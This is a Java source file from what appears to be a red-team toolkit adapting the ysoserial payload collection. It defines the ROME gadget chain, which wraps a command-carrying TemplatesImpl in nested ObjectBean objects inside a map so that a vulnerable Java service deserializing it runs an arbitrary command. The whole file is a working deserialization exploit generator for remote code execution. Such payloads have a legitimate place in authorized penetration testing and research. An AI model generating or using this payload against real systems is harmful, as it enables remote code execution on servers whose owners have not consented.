package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.sun.syndication.feed.impl.ObjectBean;

import javax.xml.transform.Templates;

@Dependencies("rome:rome:1.0")
@Authors({Authors.MBECHLER})
public class ROME implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, templates);
        ObjectBean root = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(ROME.class, args);
    }
}
